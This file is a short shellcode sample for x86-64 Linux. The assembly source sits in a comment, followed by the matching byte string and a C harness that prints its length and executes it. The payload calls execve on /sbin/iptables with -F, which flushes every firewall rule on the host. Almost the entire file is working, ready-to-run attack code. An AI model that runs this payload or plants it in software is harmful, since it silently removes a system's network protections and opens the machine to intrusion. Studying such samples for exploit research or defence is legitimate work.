/*
section .text
    global _start

_start:
    push 0x3b
    pop rax
    cdq
    push    rdx
    push    word 0x462d
    push    rsp
    pop     rcx

    push    rdx
    mov     rbx, 0x73656c6261747069
    push    rbx
    mov     rbx, 0x2f2f2f6e6962732f
    push    rbx
    push    rsp
    pop     rdi

    push    rdx
    push    rcx
    push    rdi
    push    rsp
    pop     rsi

    ; execve("/sbin/iptables", ["/sbin/iptables", "-F"], NULL);
    syscall
*/

#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x6a\x3b\x58\x99\x52\x66\x68\x2d\x46\x54\x59\x52\x48\xbb\x69\x70\x74\x61\x62\x6c\x65\x73\x53\x48\xbb\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x53\x54\x5f\x52\x51\x57\x54\x5e\x0f\x05";
void main()
{
	printf("Shellcode Length:  %lu\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}